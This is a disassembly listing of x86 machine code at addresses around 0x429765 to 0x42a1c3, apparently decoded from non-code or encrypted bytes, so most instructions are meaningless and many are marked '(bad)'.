  429765:	test   DWORD PTR [edi],esi
  429767:	and    al,ah
  429769:	fld    DWORD PTR [ebp-0x7e1df1f8]
  42976f:	mov    esi,esp
  429771:	es mov cs,esp
  429774:	sahf   
  429775:	push   ebp
  429776:	adc    esi,ebp
  429778:	adc    eax,0x86154c0b
  42977d:	fld    TBYTE PTR [eax-0x48292198]
  429783:	test   al,0x45
  429785:	scas   eax,DWORD PTR es:[edi]
  429786:	push   es
  429787:	dec    ebx
  429788:	mov    ebx,0x2d652f52
  42978d:	std    
  42978e:	pop    ebp
  42978f:	aad    0x0
	...
  4297f1:	add    BYTE PTR [eax],al
  4297f3:	add    BYTE PTR [eax],dh
  4297f5:	inc    edx
  4297f6:	fbld   TBYTE PTR [edx-0x1]
  4297f9:	(bad)  
  4297fa:	mov    ebp,0x1d164c52
  4297ff:	pop    ebp
  429800:	dec    edi
  429801:	mov    bl,0x62
  429803:	jmp    0x104:0x1bb74
  42980a:	add    BYTE PTR [eax],al
  42980c:	sub    al,0x78
  42980e:	inc    ebp
  42980f:	cld    
  429810:	(bad)  
  429811:	xchg   edi,eax
  429812:	xchg   ebp,eax
  429813:	mov    edx,0xb6294c05
  429818:	out    0xe4,eax
  42981a:	das    
  42981b:	mov    esi,0x3a4c1824
  429820:	(bad)  
  429822:	cmc    
  429823:	test   eax,0xe3222a36
  429828:	mov    esi,0xdc15b327
  42982d:	icebp  
  42982e:	push   es
  42982f:	xor    esi,esp
  429831:	in     eax,0x81
  429833:	pop    ecx
  429834:	aaa    
  429835:	imul   edx,DWORD PTR [edx+0x10],0xfffffffc
  429839:	mov    esp,0xcc9c2820
  42983e:	sub    al,0xac
  429840:	test   DWORD PTR [ebx+ebp*1],eax
  429843:	fisub  DWORD PTR ds:0x5fd1d543
  429849:	xor    ch,BYTE PTR [edx]
  42984b:	jo     0x4298b9
  42984d:	pop    ebp
  42984e:	xor    al,0x3f
  429850:	lahf   
  429851:	push   ebp
  429852:	ret    
  429853:	jg     0x42981a
  429855:	pop    esp
  429856:	fisub  WORD PTR ds:0x32653288
  42985c:	in     al,0x9f
  42985e:	fwait
  42985f:	xor    al,0xa8
  429861:	cmp    esp,DWORD PTR [ebx+0x3e137563]
  429867:	cmps   WORD PTR ds:[esi],WORD PTR es:[edi]
  429869:	(bad)  
  42986a:	retf   
  42986b:	shr    BYTE PTR [ecx-0x4b2d7369],cl
  429871:	jb     0x4298ba
  429873:	mov    esp,eax
  429875:	xor    BYTE PTR [ebp-0x33],0x2e
  429879:	repnz push es
  42987b:	mov    edi,0xad6262c5
  429880:	pusha  
  429881:	or     BYTE PTR [esi+ebp*8-0x47],al
  429885:	(bad)  [edi+edx*4]
  429888:	dec    esp
  429889:	xchg   bl,cl
  42988b:	ja     0x4298f6
  42988d:	(bad)  
  42988e:	or     BYTE PTR [ebx-0x2c],ah
  429891:	outs   dx,BYTE PTR ds:[esi]
  429892:	adc    DWORD PTR [ebx-0x5dd0d584],ebp
  429898:	pop    ebx
  429899:	jmp    DWORD PTR [ebx]
  42989b:	jecxz  0x429891
  42989d:	jb     0x42991b
  42989f:	pop    ebx
  4298a0:	es int 0xc3
  4298a3:	jbe    0x429889
  4298a5:	pop    ds
  4298a6:	shl    DWORD PTR [ebp-0x6628676f],cl
  4298ac:	jmp    0x4298ed
  4298ae:	jg     0x4298ad
  4298b0:	inc    esi
  4298b1:	mov    edx,0x55d27a7e
  4298b6:	(bad)  
  4298b7:	sar    ecx,cl
  4298b9:	jge    0x42991c
  4298bb:	fsubr  QWORD PTR [ecx-0x7a]
  4298be:	xchg   ebx,eax
  4298bf:	add    edx,edx
  4298c1:	xchg   ebx,eax
  4298c2:	xchg   edi,eax
  4298c3:	push   0xffffffe7
  4298c5:	adc    eax,DWORD PTR [esi+ebp*8-0x592daa5b]
  4298cc:	(bad)  
  4298cd:	jge    0x4298e9
  4298cf:	or     BYTE PTR [edx],0xd0
  4298d2:	fmul   DWORD PTR [ebx-0x56]
  4298d5:	(bad)  
  4298d6:	pop    ds
  4298d7:	daa    
  4298d8:	push   0xfffffffc
  4298da:	fld    TBYTE PTR [esi]
  4298dc:	mov    edi,0x7c03e193
  4298e1:	rcl    DWORD PTR [ecx+ecx*1+0x2e],cl
  4298e5:	jmp    0x5747909
  4298ea:	cmc    
  4298eb:	call   ebp
  4298ed:	cli    
  4298ee:	adc    dh,BYTE PTR [ebp-0x16]
  4298f1:	push   esp
  4298f2:	pop    edi
  4298f3:	mov    ebp,0xb11504d0
  4298f8:	push   ecx
  4298f9:	icebp  
  4298fa:	jmp    DWORD PTR ds:0x1d81546e
  429900:	adc    al,0x3d
  429902:	sub    bh,BYTE PTR [ebx+0x1226f723]
  429908:	(bad)
  42990d:	or     eax,0x83f
	...
  429972:	add    BYTE PTR [eax],al
  429974:	push   edi
  429975:	push   0xdf7fdf64
  42997a:	(bad)  
  42997b:	call   0x3b7e6d73
  429980:	jmp    0x78588ff4
  429985:	mov    esp,0x1040001
  42998a:	add    BYTE PTR [eax],al
  42998c:	jno    0x429977
  42998e:	xchg   ecx,eax
  42998f:	push   ebp
  429990:	enter  0x3b7c,0x3c
  429994:	pop    edx
  429995:	stc    
  429996:	push   eax
  429997:	add    dh,dl
  429999:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42999a:	mov    esi,0x62363900
  42999f:	rcl    DWORD PTR [edi+ecx*4+0x1fe3da57],0xb9
  4299a7:	inc    ecx
  4299a8:	adc    eax,0x853e2b35
  4299ad:	fsubr  st(5),st
  4299af:	pop    ds
  4299b0:	sub    eax,0xcd6c8090
  4299b5:	add    al,0x17
  4299b7:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4299b8:	imul   edx,eax,0x42a21811
  4299be:	lea    edx,ds:0xc1495ab3
  4299c4:	fnstenv [edi]
  4299c6:	cli    
  4299c7:	pop    ebx
  4299c8:	pop    edx
  4299c9:	ret    0xaf3f
  4299cc:	outs   dx,BYTE PTR ds:[esi]
  4299cd:	and    cl,BYTE PTR [ebx]
  4299cf:	and    al,BYTE PTR [ecx]
  4299d1:	aad    0x21
  4299d3:	mov    dl,0xe9
  4299d5:	js     0x4299b6
  4299d7:	leave  
  4299d8:	call   0x887172e9
  4299dd:	ss rol esp,0xa7
  4299e1:	cli    
  4299e2:	or     BYTE PTR [esi-0x80],dh
  4299e5:	popa   
  4299e6:	in     eax,dx
  4299e7:	dec    esp
  4299e8:	xor    al,0x17
  4299ea:	dec    esi
  4299eb:	jbe    0x429979
  4299ed:	xchg   ebx,eax
  4299ee:	ror    DWORD PTR [edx+0x76],cl
  4299f1:	jns    0x4299f5
  4299f3:	xor    eax,0xbda92248
  4299f8:	pop    eax
  4299f9:	stos   DWORD PTR es:[edi],eax
  4299fa:	bswap  esp
  4299fc:	je     0x4299bf
  4299fe:	scas   eax,DWORD PTR es:[edi]
  4299ff:	leave  
  429a00:	int    0x28
  429a02:	inc    eax
  429a03:	and    eax,0xf1bc7a53
  429a08:	movaps XMMWORD PTR [ecx-0x79bf3462],xmm6
  429a0f:	pusha  
  429a10:	mov    ch,0xe
  429a12:	jp     0x429a7b
  429a14:	adc    DWORD PTR ds:0xf769fe67,ebx
  429a1a:	call   0xd901d3ed
  429a1f:	pop    edx
  429a20:	jl     0x4299b8
  429a22:	mov    edx,edx
  429a24:	js     0x429a1a
  429a26:	adc    al,0xae
  429a28:	fwait
  429a29:	jmp    0x429a3a
  429a2b:	or     eax,0x244b920a
  429a30:	push   edi
  429a31:	clc    
  429a32:	add    BYTE PTR [ebp-0x60],ch
  429a35:	xor    BYTE PTR [ecx],0x72
  429a38:	imul   edx,DWORD PTR [ebx+0x16],0x6e
  429a3c:	and    BYTE PTR [edx+0x171f754d],bh
  429a42:	rcr    DWORD PTR [eax],0x8e
  429a45:	jns    0x429a86
  429a47:	jae    0x4299db
  429a49:	xchg   ebx,eax
  429a4a:	(bad)
  429a4e:	setbe  BYTE PTR [eax-0x733ab796]
  429a55:	lods   eax,DWORD PTR ds:[esi]
  429a56:	out    dx,al
  429a57:	cwde   
  429a58:	mov    al,ds:0xc0958c3e
  429a5d:	mov    BYTE PTR [ebx-0x51],ch
  429a60:	sbb    BYTE PTR [edx],al
  429a62:	dec    esi
  429a63:	push   es
  429a64:	mov    dl,0xc9
  429a66:	cld    
  429a67:	xor    ah,dh
  429a69:	dec    esp
  429a6a:	(bad)  
  429a6b:	cdq    
  429a6c:	es cmp al,al
  429a6f:	dec    BYTE PTR [edi]
  429a71:	les    edx,FWORD PTR [edi+0x63432571]
  429a77:	xchg   DWORD PTR fs:0x23fca752,eax
  429a7e:	outs   dx,DWORD PTR ds:[esi]
  429a7f:	xchg   ebx,eax
  429a80:	mov    edi,0xe8ff7e5
  429a85:	xor    eax,0x1dd26f7
  429a8a:	nop
  429a8b:	xchg   BYTE PTR [edx],ch
  429a8d:	xchg   edi,eax
  429a8e:	mov    esp,0x54
	...
  429af3:	add    dh,cl
  429af5:	std    
  429af6:	sti    
  429af7:	leave  
  429af8:	sti    
  429af9:	iret   
  429afa:	(bad)  
  429afb:	jmp    DWORD PTR ds:0x38a95667
  429b01:	lea    edi,[esi]
  429b03:	ins    DWORD PTR es:[edi],dx
  429b04:	jl     0x429ac3
  429b06:	add    DWORD PTR [eax],eax
  429b08:	add    al,0x1
  429b0a:	add    BYTE PTR [eax],al
  429b0c:	test   ah,0x37
  429b0f:	es addr16 int 0x2c
  429b13:	sub    dl,BYTE PTR [esi+0x7e]
  429b16:	sub    al,0x20
  429b18:	dec    edi
  429b19:	cmp    BYTE PTR [eax+eax*8-0x66],ah
  429b1d:	clc    
  429b1e:	std    
  429b1f:	jmp    0xf3025597
  429b24:	mov    ch,0x37
  429b26:	ror    DWORD PTR [esi-0x10],0x82
  429b2a:	lds    ebx,FWORD PTR [ebp-0x5a]
  429b2d:	mov    esi,0x6a5322d4
  429b32:	cld    
  429b33:	ret    0x5b7
  429b36:	cdq    
  429b37:	push   esp
  429b38:	xor    ah,dl
  429b3a:	or     BYTE PTR [edx+0x6e],0x7d
  429b3e:	pop    eax
  429b3f:	sar    BYTE PTR [eax-0x7ecf8c6],0x3b
  429b46:	ds iret 
  429b48:	call   0xcc5e:0x61f9faa3
  429b4f:	mov    WORD PTR [edx+0xa0cd946],es
  429b55:	pop    ecx
  429b56:	mov    dl,0xa3
  429b58:	rcr    BYTE PTR [edx-0x481bd3da],cl
  429b5e:	fld    DWORD PTR [edx+0xf02d2c0]
  429b64:	lahf   
  429b65:	add    DWORD PTR [ebp+esi*1-0x4a],0xd25ed6ca
  429b6d:	adc    ah,cl
  429b6f:	nop
  429b70:	xchg   edx,eax
  429b71:	fisttp QWORD PTR [edx]
  429b73:	aad    0xca
  429b75:	not    ah
  429b77:	inc    ebx
  429b78:	pusha  
  429b79:	repz push ds
  429b7b:	sub    eax,0x75fe9496
  429b80:	mov    edi,0x5abe5932
  429b85:	mov    ds:0x72899cc6,eax
  429b8a:	push   ss
  429b8b:	and    bh,BYTE PTR [ecx]
  429b8d:	fcomp  DWORD PTR [ecx]
  429b8f:	call   0x1da8815d
  429b94:	rol    BYTE PTR [ebp-0x3e],1
  429b97:	push   esp
  429b98:	ins    BYTE PTR es:[edi],dx
  429b99:	and    ebp,DWORD PTR [bx+si+0x1030]
  429b9e:	std    
  429b9f:	call   0xb428944d
  429ba4:	fadd   st(4),st
  429ba6:	in     al,dx
  429ba7:	cmp    edx,DWORD PTR [eax]
  429ba9:	jns    0x429c09
  429bab:	push   esi
  429bac:	pop    ds
  429bad:	push   esp
  429bae:	loope  0x429bbb
  429bb0:	pop    edi
  429bb1:	add    esi,DWORD PTR [ebx+0x22]
  429bb4:	xchg   esi,eax
  429bb5:	int    0x0
  429bb7:	test   al,0xa9
  429bb9:	out    dx,eax
  429bba:	jbe    0x429b53
  429bbc:	or     eax,0xa029fea4
  429bc1:	inc    ecx
  429bc2:	shr    BYTE PTR [eax-0xb],0x1
  429bc6:	lods   eax,DWORD PTR ds:[esi]
  429bc7:	test   eax,0xf18a4007
  429bcc:	sub    al,0x82
  429bce:	pop    ss
  429bcf:	ins    BYTE PTR es:[edi],dx
  429bd0:	pop    esi
  429bd1:	into   
  429bd2:	int3   
  429bd3:	std    
  429bd4:	jle    0x429c08
  429bd6:	inc    eax
  429bd7:	in     al,0xc
  429bd9:	push   eax
  429bda:	ret    
  429bdb:	int    0x7a
  429bdd:	xchg   BYTE PTR [ecx],cl
  429bdf:	inc    edi
  429be0:	inc    esi
  429be1:	out    0x46,al
  429be3:	xlat   BYTE PTR ds:[ebx]
  429be4:	push   ds
  429be5:	es fwait
  429be7:	es mov ecx,?
  429bea:	cmp    ebx,DWORD PTR [ebp+0x55]
  429bed:	aam    0x86
  429bef:	jp     0x429c40
  429bf1:	dec    esp
  429bf2:	jge    0x429ba0
  429bf4:	fld    QWORD PTR [ecx+0x7809ff4]
  429bfa:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  429bfb:	and    edx,DWORD PTR [esi-0x7c]
  429bfe:	push   0xbafd25e2
  429c03:	push   es
  429c04:	icebp  
  429c05:	outs   dx,DWORD PTR ds:[esi]
  429c06:	or     ecx,DWORD PTR [eax+0x29]
  429c09:	or     DWORD PTR [ebx],eax
  429c0b:	adc    eax,DWORD PTR [ecx]
  429c0d:	xor    edi,ebx
  429c0f:	mov    dl,0x0
	...
  429c71:	add    BYTE PTR [eax],al
  429c73:	add    BYTE PTR [ebx-0x487759ea],ah
  429c79:	mov    eax,0x89413faf
  429c7e:	(bad)  
  429c7f:	xor    BYTE PTR [edi+ebp*2-0x417f1eea],bh
  429c86:	add    DWORD PTR [eax],eax
  429c88:	add    al,0x1
  429c8a:	add    BYTE PTR [eax],al
  429c8c:	lods   eax,DWORD PTR ds:[esi]
  429c8d:	mov    ah,0xea
  429c8f:	mov    WORD PTR [edi],ds
  429c91:	mov    ecx,0xf39151c4
  429c96:	inc    ebx
  429c97:	lock movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  429c99:	retf   
  429c9a:	mul    BYTE PTR [ebx-0x18a57335]
  429ca0:	adc    eax,0xf624674c
  429ca5:	mov    DWORD PTR ds:0xdee6d6eb,esp
  429cab:	ins    BYTE PTR es:[edi],dx
  429cac:	imul   esi,eax,0x5d
  429caf:	mov    WORD PTR [eax-0x1df694f4],?
  429cb5:	jmp    0x429cd7
  429cb7:	lea    edx,[ebx-0x31]
  429cba:	fmul   QWORD PTR [ebx-0x70]
  429cbd:	add    eax,0x941d27bf
  429cc2:	fst    DWORD PTR [eax]
  429cc4:	sbb    DWORD PTR [eax+edi*1-0x5774a736],ebx
  429ccb:	or     BYTE PTR [ebp-0x76],bh
  429cce:	fmul   st(7),st
  429cd0:	or     DWORD PTR [edi-0x4f2f58d1],edx
  429cd6:	mov    ebx,0x973e8d7
  429cdb:	dec    ebp
  429cdc:	leave  
  429cdd:	mov    al,0x8f
  429cdf:	lods   al,BYTE PTR ds:[esi]
  429ce0:	sbb    ah,bh
  429ce2:	or     edi,eax
  429ce4:	dec    esp
  429ce5:	or     BYTE PTR ds:0x62135007,dh
  429ceb:	dec    esi
  429cec:	mov    ch,0x6c
  429cee:	cld    
  429cef:	mov    edi,0x8dba7b9
  429cf4:	frstor [eax]
  429cf6:	ss nop
  429cf8:	pop    eax
  429cf9:	sbb    al,cl
  429cfb:	mov    eax,0xd28427eb
  429d00:	(bad)  
  429d01:	jmp    0x211a5206
  429d06:	and    DWORD PTR [esi],ecx
  429d08:	les    esi,FWORD PTR [ebx-0x61]
  429d0b:	xchg   ebp,eax
  429d0c:	ret    0x155f
  429d0f:	ret    
  429d10:	inc    edx
  429d11:	scas   eax,DWORD PTR es:[edi]
  429d12:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  429d13:	(bad)  
  429d15:	sub    BYTE PTR [ecx+0x75],dh
  429d18:	pop    eax
  429d19:	add    DWORD PTR [ecx-0x78],0x795f80dd
  429d20:	nop
  429d21:	push   eax
  429d22:	jl     0x429cd9
  429d24:	pop    edi
  429d25:	xchg   ecx,eax
  429d26:	and    BYTE PTR [ebp-0x9e98fa6],bh
  429d2c:	daa    
  429d2d:	or     cl,0x85
  429d30:	fstp   QWORD PTR [ebx+0x39]
  429d33:	iret   
  429d34:	ss jns 0x429d4a
  429d37:	dec    eax
  429d38:	out    dx,al
  429d39:	(bad)  
  429d3b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  429d3c:	jmp    0xf253547a
  429d41:	push   eax
  429d42:	daa    
  429d43:	jmp    0x429daa
  429d45:	leave  
  429d46:	dec    edx
  429d47:	popa   
  429d48:	adc    eax,0x6a27a597
  429d4d:	jp     0x429d93
  429d4f:	xchg   esp,eax
  429d50:	call   0xfac:0xf08423b7
  429d57:	lahf   
  429d58:	jmp    0x33808f49
  429d5d:	int3   
  429d5e:	sbb    BYTE PTR ds:0x52b0e7ad,dh
  429d64:	aaa    
  429d65:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  429d66:	sub    edx,DWORD PTR [edi-0x10]
  429d69:	inc    eax
  429d6a:	xchg   edx,eax
  429d6b:	retf   0xc63b
  429d6e:	sbb    bh,bh
  429d70:	outs   dx,BYTE PTR ds:[esi]
  429d71:	scas   al,BYTE PTR es:[edi]
  429d72:	sub    dh,BYTE PTR [ebx+eiz*1]
  429d75:	rcr    DWORD PTR [edi],0x6f
  429d78:	test   DWORD PTR [edx+0x2f2ee7cb],esi
  429d7e:	cmp    al,al
  429d80:	mov    dl,0x36
  429d82:	dec    esp
  429d83:	push   cs
  429d84:	mov    dl,0x33
  429d86:	push   cs
  429d87:	cmovne ebp,DWORD PTR [esi]
  429d8a:	in     eax,0x57
  429d8c:	add    BYTE PTR [edx-0x1a],dl
  429d8f:	mov    eax,DWORD PTR [eax]
	...
  429df1:	add    BYTE PTR [eax],al
  429df3:	add    BYTE PTR [ebx-0x13f33b49],bl
  429df9:	jg     0x429dd6
  429dfb:	mov    bh,0xe1
  429dfd:	sahf   
  429dfe:	loop   0x429e68
  429e00:	xchg   BYTE PTR [ebx-0x407b0490],ah
  429e06:	add    DWORD PTR [eax],eax
  429e08:	add    al,0x1
  429e0a:	add    BYTE PTR [eax],al
  429e0c:	push   es
  429e0d:	inc    esi
  429e0e:	jecxz  0x429e6d
  429e10:	mov    BYTE PTR [ecx+0x2d],0x7c
  429e14:	sub    BYTE PTR [esp+ebp*2-0x55aa26d9],0x53
  429e1c:	mov    eax,ds:0xf4956fcb
  429e21:	cmp    cl,BYTE PTR [edi-0x2be95e3b]
  429e27:	mov    ebp,0xe8d545ab
  429e2c:	pop    ebp
  429e2d:	pop    eax
  429e2e:	xor    eax,0xb77d0867
  429e33:	jbe    0x429e57
  429e35:	cmp    BYTE PTR [ebp+0x1b400600],ah
  429e3b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  429e3c:	ja     0x429e59
  429e3e:	out    0x30,al
  429e40:	mov    ah,0xd1
  429e42:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  429e43:	mov    dh,0x20
  429e45:	retf   0x5f14
  429e48:	jbe    0x429e3a
  429e4a:	aam    0x31
  429e4c:	sub    BYTE PTR [esi+0x37],dl
  429e4f:	and    dh,al
  429e51:	mov    ebx,0x7ebd5310
  429e56:	pop    ds
  429e57:	in     eax,0xbe
  429e59:	ret    0xb8a6
  429e5c:	xor    eax,0x2cacfd7
  429e61:	jne    0x429e28
  429e63:	xor    eax,0x70fbc7a
  429e68:	sub    eax,0x1bb18575
  429e6d:	mov    ebx,0x5c66732b
  429e72:	lods   al,BYTE PTR ds:[esi]
  429e73:	adc    eax,0xb049aa02
  429e78:	mov    al,dl
  429e7a:	mov    eax,0x70c12ec6
  429e7f:	out    dx,al
  429e80:	daa    
  429e81:	jmp    0x429eb8
  429e83:	hlt    
  429e84:	mov    esi,0xe343a0af
  429e89:	iret   
  429e8a:	pop    ss
  429e8b:	push   ebx
  429e8c:	jb     0x429edb
  429e8e:	fst    DWORD PTR [ebx+ecx*1+0x359373ec]
  429e95:	cmp    BYTE PTR [esp+ecx*8+0x49],bl
  429e99:	sbb    edi,DWORD PTR [edx-0xc]
  429e9c:	pop    ds
  429e9d:	mov    dh,0xf
  429e9f:	adc    ch,BYTE PTR [ecx+edx*4]
  429ea2:	and    bh,BYTE PTR [ebp-0x4e18401c]
  429ea8:	push   ds
  429ea9:	mov    ebx,0xaf1c97d9
  429eae:	xchg   ebx,eax
  429eaf:	iret   
  429eb0:	inc    eax
  429eb1:	jmp    0x2f860b0e
  429eb6:	lea    ecx,[ecx+0x7df6fe96]
  429ebc:	outs   dx,BYTE PTR ds:[esi]
  429ebd:	popa   
  429ebe:	mov    eax,0x80b6e4f6
  429ec3:	out    0xc8,al
  429ec5:	leave  
  429ec6:	daa    
  429ec7:	jmp    0xb7e9951a
  429ecc:	inc    ebp
  429ecd:	sub    eax,DWORD PTR [esi]
  429ecf:	mov    ch,0xb
  429ed1:	ins    DWORD PTR es:[edi],dx
  429ed2:	and    edx,ecx
  429ed4:	aas    
  429ed5:	daa    
  429ed6:	lods   al,BYTE PTR ds:[esi]
  429ed7:	ins    DWORD PTR es:[edi],dx
  429ed8:	push   ebp
  429ed9:	push   cs
  429eda:	or     al,0x16
  429edc:	out    dx,eax
  429edd:	pop    es
  429ede:	push   es
  429edf:	jle    0x429f56
  429ee1:	cmp    eax,DWORD PTR [ecx]
  429ee3:	fs ret 0x6694
  429ee7:	xchg   BYTE PTR [ebx-0x29e755b0],ah
  429eed:	xchg   esi,eax
  429eee:	or     DWORD PTR [eax-0x6b8e503e],esi
  429ef4:	imul   eax,DWORD PTR [esi-0x3],0x77b8d5ca
  429efb:	sub    eax,DWORD PTR [ebx]
  429efd:	pop    ebp
  429efe:	or     eax,0x20a01247
  429f03:	adc    al,0xdc
  429f05:	sahf   
  429f06:	out    dx,al
  429f07:	pop    edx
  429f08:	dec    edi
  429f09:	cmp    BYTE PTR [esi+0x4c],dh
  429f0c:	test   ebp,edx
  429f0e:	out    0x96,eax
	...
  429f74:	xor    DWORD PTR [ebp-0x38],eax
  429f77:	push   es
  429f78:	cld    
  429f79:	(bad)  
  429f7a:	push   DWORD PTR [edi-0x50]
  429f7d:	cld    
  429f7e:	sbb    esp,DWORD PTR [ebx+0x73d75308]
  429f84:	mov    al,al
  429f86:	add    DWORD PTR [eax],eax
  429f88:	add    al,0x1
  429f8a:	add    BYTE PTR [eax],al
  429f8c:	xor    dh,BYTE PTR [eax]
  429f8e:	arpl   WORD PTR [edi],di
  429f90:	out    dx,eax
  429f91:	imul   esi,DWORD PTR [eax+0x6d],0xffffffa5
  429f95:	lods   al,BYTE PTR ds:[esi]
  429f96:	sub    BYTE PTR [esi-0x4e08c889],bh
  429f9c:	out    dx,eax
  429f9d:	jo     0x429f87
  429f9f:	lods   al,BYTE PTR ds:[esi]
  429fa0:	std    
  429fa1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  429fa2:	push   ebp
  429fa3:	push   edx
  429fa4:	cld    
  429fa5:	dec    esi
  429fa6:	std    
  429fa7:	jl     0x429ff5
  429fa9:	mov    eax,ds:0x1e87b738
  429fae:	push   0x5b8c2285
  429fb3:	sbb    ch,BYTE PTR [ecx]
  429fb5:	sbb    DWORD PTR [edi+eiz*1+0x799eeffe],0x78898873
  429fc0:	sahf   
  429fc1:	push   ebx
  429fc2:	ret    0x79de
  429fc5:	add    al,0xf9
  429fc7:	rcl    BYTE PTR [eax],cl
  429fc9:	pop    edi
  429fca:	pop    es
  429fcb:	(bad)  
  429fcd:	cmp    BYTE PTR [edx-0x57],al
  429fd0:	test   ch,bh
  429fd2:	mov    bl,0xa1
  429fd4:	xchg   edi,eax
  429fd5:	fistp  DWORD PTR [ebp-0x1a0a3440]
  429fdb:	stc    
  429fdc:	test   BYTE PTR [edi-0x5c],ah
  429fdf:	rcl    DWORD PTR [ecx-0x8],cl
  429fe2:	and    eax,0x158d9c51
  429fe7:	fisttp WORD PTR [ebx-0x5ff5679c]
  429fed:	mov    ebx,DWORD PTR [eax]
  429fef:	adc    ch,al
  429ff1:	lods   al,BYTE PTR ds:[esi]
  429ff2:	and    al,0x2b
  429ff4:	xor    eax,0x14fb7c3
  429ff9:	shr    BYTE PTR [esi-0x69],cl
  429ffc:	or     DWORD PTR [di-0x4e3a],ebx
  42a001:	sub    ah,BYTE PTR [ecx]
  42a003:	xchg   bl,bh
  42a005:	inc    ecx
  42a006:	jmp    0xd6ba22ad
  42a00b:	inc    eax
  42a00c:	jbe    0x42a081
  42a00e:	push   ebx
  42a00f:	pop    esi
  42a010:	mov    BYTE PTR [edi],ch
  42a012:	mov    ebx,0xe1a9ec0
  42a017:	push   0xdc84bbd4
  42a01c:	repz fwait
  42a01e:	adc    eax,DWORD PTR [ebx]
  42a020:	cmp    BYTE PTR [ecx-0x100642ad],al
  42a026:	js     0x42a03a
  42a028:	clc    
  42a029:	or     ebp,DWORD PTR [ebx+0x41284907]
  42a02f:	ins    BYTE PTR es:[edi],dx
  42a030:	call   0x4ff0:0x1e5cb33b
  42a037:	inc    edx
  42a038:	ins    DWORD PTR es:[edi],dx
  42a039:	gs ja  0x42a080
  42a03c:	add    DWORD PTR [edx],edi
  42a03e:	xchg   ebp,eax
  42a03f:	cmp    bl,ah
  42a041:	inc    ebp
  42a042:	push   ds
  42a043:	mov    edx,0xcc788659
  42a048:	jle    0x42a059
  42a04a:	jecxz  0x42a03e
  42a04c:	jns    0x42a056
  42a04e:	mov    ds:0x78f3eb1,eax
  42a053:	(bad)  
  42a054:	loop   0x42a08d
  42a056:	xchg   edx,eax
  42a057:	pop    esp
  42a058:	or     eax,0x73d7b9bc
  42a05d:	push   ds
  42a05e:	mov    dl,0x57
  42a060:	dec    edi
  42a061:	mov    esp,0xa9f8eebb
  42a066:	sbb    BYTE PTR [eax],bh
  42a068:	add    BYTE PTR [eax+0x5e],al
  42a06b:	push   cs
  42a06c:	and    eax,0x8ce2442b
  42a071:	pop    eax
  42a072:	or     al,0xea
  42a074:	in     al,dx
  42a075:	or     al,0xbe
  42a077:	retfw  0xed3
  42a07b:	pop    ebp
  42a07c:	cwde   
  42a07d:	mov    bl,0xab
  42a07f:	adc    eax,0x669ffc71
  42a084:	mov    ds:0xc580f009,eax
  42a089:	lea    edx,[ebx+0x7]
  42a08c:	data16 das 
  42a08e:	dec    eax
  42a08f:	pusha  
	...
  42a0f4:	xlat   BYTE PTR ds:[ebx]
  42a0f5:	pushf  
  42a0f6:	shr    BYTE PTR [ebp-0x1000235],0xdb
  42a0fd:	call   FWORD PTR [ebx]
  42a0ff:	(bad)  
  42a100:	fidivr DWORD PTR [edx-0x3e738024]
  42a106:	add    DWORD PTR [eax],eax
  42a108:	add    al,0x1
  42a10a:	add    BYTE PTR [eax],al
  42a10c:	push   es
  42a10d:	push   esp
  42a10e:	shr    BYTE PTR [edx+0x23],1
  42a111:	jne    0x42a16c
  42a113:	mov    dl,0x14
  42a115:	aas    
  42a116:	(bad)  
  42a117:	(bad)  
  42a118:	test   DWORD PTR [ecx+eax*2-0x79],ecx
  42a11c:	mov    ecx,0x1f2eaf7a
  42a121:	sti    
  42a122:	ret    
  42a123:	mov    edx,0x3da8de25
  42a128:	enter  0xd7a9,0x1c
  42a12c:	inc    esp
  42a12d:	nop
  42a12e:	jmp    0x7adf:0x908924a6
  42a135:	loopne 0x42a138
  42a137:	idiv   BYTE PTR [ebp+0xf]
  42a13a:	add    eax,0x5042882f
  42a13f:	and    DWORD PTR [edi+eax*1],edi
  42a142:	(bad)  
  42a143:	pop    ecx
  42a144:	mov    ds:0xc7f7afab,al
  42a149:	pop    edi
  42a14a:	in     al,0xae
  42a14c:	jb     0x42a120
  42a14e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42a14f:	cdq    
  42a150:	rol    BYTE PTR [ecx+eiz*2+0x1bdbfe83],cl
  42a157:	fnstenv [edx+0x6f5ca7f6]
  42a15d:	mov    edx,0xa9badc50
  42a162:	cld    
  42a163:	sbb    eax,ebx
  42a165:	sar    DWORD PTR [ecx+0x1e],0xa5
  42a169:	popa   
  42a16a:	jmp    0x42a1a6
  42a16c:	lahf   
  42a16d:	pop    es
  42a16e:	cmp    edi,ebp
  42a170:	(bad)  
  42a171:	into   
  42a172:	lods   eax,DWORD PTR ds:[esi]
  42a173:	mov    bl,0x40
  42a175:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42a176:	cli    
  42a177:	lods   al,BYTE PTR ds:[esi]
  42a178:	and    BYTE PTR [eax],dl
  42a17a:	pop    edx
  42a17b:	pop    esp
  42a17c:	fild   QWORD PTR [ebp+0x1e6c8018]
  42a182:	mul    BYTE PTR [edx]
  42a184:	sti    
  42a185:	cwde   
  42a186:	sbb    BYTE PTR [eax-0x2fe7f590],ch
  42a18c:	loop   0x42a1fb
  42a18e:	repz loope 0x42a16a
  42a191:	fwait
  42a192:	mov    ebx,0x87fa9261
  42a197:	xchg   edi,eax
  42a198:	stc    
  42a199:	and    esp,ebx
  42a19b:	pop    esi
  42a19c:	jnp    0x42a1c2
  42a19e:	mov    BYTE PTR [ebp+eax*8+0x7f],bl
  42a1a2:	or     eax,0x51213a04
  42a1a7:	test   al,0xf
  42a1a9:	cli    
  42a1aa:	imul   ebp,esp,0xffffffe7
  42a1ad:	inc    edx
  42a1ae:	pop    ebp
  42a1af:	add    DWORD PTR [ebp+0x38],0xfffffffe
  42a1b3:	cwde   
  42a1b4:	adc    DWORD PTR [edx-0x41],0xac8abd35
  42a1bb:	xor    edx,eax
  42a1bd:	xor    DWORD PTR [ebx-0x1b8fb18a],ebx
  42a1c3:	cmp    BYTE PTR [esi+0x414b81af],dh
